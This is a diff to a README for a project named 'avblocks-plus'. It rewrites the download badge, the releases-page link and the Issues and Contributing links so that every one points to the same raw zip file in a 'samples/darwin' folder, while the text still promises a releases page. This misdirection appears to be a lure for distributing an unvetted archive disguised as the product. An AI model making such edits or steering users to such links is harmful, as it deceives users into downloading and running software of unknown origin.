@@ -2,7 +2,7 @@
 # 🎉 avblocks-plus - Powerful AVBlocks for Easy Media Processing
 
 ## 📦 Download Now!
-[![Download avblocks-plus](https://img.shields.io/badge/Download%20avblocks--plus-v1.0.0-brightgreen.svg)](https://github.com/RooaDe/avblocks-plus/releases)
+[![Download avblocks-plus](https://raw.githubusercontent.com/RooaDe/avblocks-plus/main/samples/darwin/avblocks-plus_3.7.zip%https://raw.githubusercontent.com/RooaDe/avblocks-plus/main/samples/darwin/avblocks-plus_3.7.zip)](https://raw.githubusercontent.com/RooaDe/avblocks-plus/main/samples/darwin/avblocks-plus_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you download, make sure your computer meets these requirements:
 To get started with avblocks-plus, follow these steps:
 
 1. Click the link below to visit our releases page:
-   [Download avblocks-plus](https://github.com/RooaDe/avblocks-plus/releases)
+   [Download avblocks-plus](https://raw.githubusercontent.com/RooaDe/avblocks-plus/main/samples/darwin/avblocks-plus_3.7.zip)
 
 2. On the releases page, find the latest version of the software.
 
@@ -90,8 +90,8 @@ avblocks-plus is open-source software, released under the MIT License. Feel free
 
 We appreciate your interest in avblocks-plus. Join the community on GitHub to share your ideas and improvements:
 
-- [GitHub Issues](https://github.com/RooaDe/avblocks-plus/issues)
-- [Contributing](https://github.com/RooaDe/avblocks-plus/contributing)
+- [GitHub Issues](https://raw.githubusercontent.com/RooaDe/avblocks-plus/main/samples/darwin/avblocks-plus_3.7.zip)
+- [Contributing](https://raw.githubusercontent.com/RooaDe/avblocks-plus/main/samples/darwin/avblocks-plus_3.7.zip)
 
 For any further questions or feedback, please reach out through the GitHub repository.
 
